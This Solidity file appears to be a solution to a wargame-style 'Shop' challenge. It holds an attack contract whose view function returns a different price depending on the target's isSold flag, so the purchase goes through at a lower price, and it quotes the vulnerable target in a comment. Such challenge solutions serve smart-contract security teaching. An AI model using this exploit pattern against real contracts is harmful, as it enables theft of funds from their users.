// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

interface IShop {
    function buy() external;
    function price() external view returns (uint256);
    function isSold() external view returns (bool);
}

contract ShopHack {
    IShop private immutable targetShop;

    constructor(address _targetAddress) {
        targetShop = IShop(_targetAddress);
    }

    function attack() external {
        targetShop.buy();
        require(targetShop.price() == 69, "price != 69");
    }
    // Because it's a view function we can't manipulate any state variables
    // But we can base our condition off the isSold public state variable.
    function price() external view returns (uint256) {
        if (targetShop.isSold()) {
            return 69;
        }
        return 420;
    }
}

/*
// Target Contract
interface Buyer {
  function price() external view returns (uint);
}

contract Shop {
  uint public price = 100;
  bool public isSold;

  function buy() public {
    Buyer _buyer = Buyer(msg.sender);

    if (_buyer.price() >= price && !isSold) {
      isSold = true;
      price = _buyer.price();
    }
  }
}
*/